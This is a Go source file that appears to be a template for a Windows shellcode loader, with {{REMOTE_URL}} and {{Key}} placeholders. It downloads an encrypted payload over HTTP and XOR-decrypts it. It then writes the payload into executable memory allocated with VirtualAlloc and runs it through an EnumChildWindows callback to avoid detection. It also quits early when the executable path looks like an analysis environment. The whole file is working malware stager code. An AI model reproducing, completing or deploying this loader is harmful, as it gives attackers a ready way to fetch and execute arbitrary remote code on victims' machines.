package main

import (
	"os"
	"syscall"
	"unsafe"

	"github.com/valyala/fasthttp"
)

var (
	timer int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	CAL_SMONTHNAME1        = 0x00000015
	ENUM_ALL_CALENDARS     = 0xffffffff
	SORT_DEFAULT           = 0x0
)

var (
	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	ntdll            = syscall.NewLazyDLL("ntdll.dll")
	User32           = syscall.NewLazyDLL("User32.dll")
	VirtualAlloc     = kernel32.NewProc("VirtualAlloc")
	EnumChildWindows = User32.NewProc("EnumChildWindows")
	RtlMoveMemory    = ntdll.NewProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	EnumChildWindows.Call(0, addr, 0)
}

func XorDecrypt(plaintext []byte, key []byte) []byte {
	ciphertext := make([]byte, len(plaintext))
	keyLength := len(key)
	for i, byte := range plaintext {
		keyByte := key[i%keyLength]
		encryptedByte := byte ^ keyByte
		ciphertext[i] = encryptedByte
	}
	return ciphertext
}

func DecryptData(shellcode []byte) []byte {
	key := []byte{{{Key}}}
	decryptShellcode := XorDecrypt(shellcode, key)
	return decryptShellcode
}

func fetchShellcode(url string) []byte {
	_, body, _ := fasthttp.Get(nil, url)
	return body
}

func main() {
	args := os.Args[0]
	if args[10] == 92 && (args[0] == 99 || args[0] == 67) {
		os.Exit(0)
	}

	ciphertext := fetchShellcode("{{REMOTE_URL}}")
	byteData := DecryptData(ciphertext)
	Callback(byteData)
}
